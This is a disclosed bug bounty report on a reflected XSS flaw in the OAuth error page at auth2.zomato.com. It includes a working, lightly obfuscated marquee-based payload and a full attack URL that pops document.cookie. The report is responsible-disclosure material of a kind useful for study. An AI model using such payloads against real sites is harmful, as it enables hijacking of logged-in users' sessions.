# [auth2.zomato.com] Reflected XSS at `oauth2/fallbacks/error` | ORY Hydra an OAuth 2.0 and OpenID Connect Provider

## Report Details
- **Report ID**: 456333
- **URL**: https://hackerone.com/reports/456333
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-12-05T18:21:06.884Z
- **Disclosed**: 2019-01-21T05:54:09.831Z

## Reporter
- **Username**: sudi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zomato

## Vulnerability Information
Heyy there,
I have found a xss in auth2.zomato.com

**Full url:**https://auth2.zomato.com/oauth2/fallbacks/error?error=xss&error_description=xss&error_hint=xss
**Vulnerable Parameters:** All available parameters are vulnerable
**XSS Payload:** `<marquee loop%3d1 width%3d0 onfinish%3dco\u006efirm(document.cookie)>XSS<%2fmarquee>`

**Steps To Reproduce the xss**
Just copy paste and load this url in your firefox browser and tadaa you will get the xss popup
`https://auth2.zomato.com/oauth2/fallbacks/error?error=xss&error_description=xsssy&error_hint=%3Cmarquee%20loop%3d1%20width%3d0%20onfinish%3dco\u006efirm(document.cookie)%3EXSS%3C%2fmarquee%3E`

**POC:**
{F386017}

## Impact

An attacker can send this url with payload to an already  login user and can steal the cookie.

Thankyou
Kind Regards
Sudhanshu

## Attachments
- POC.png
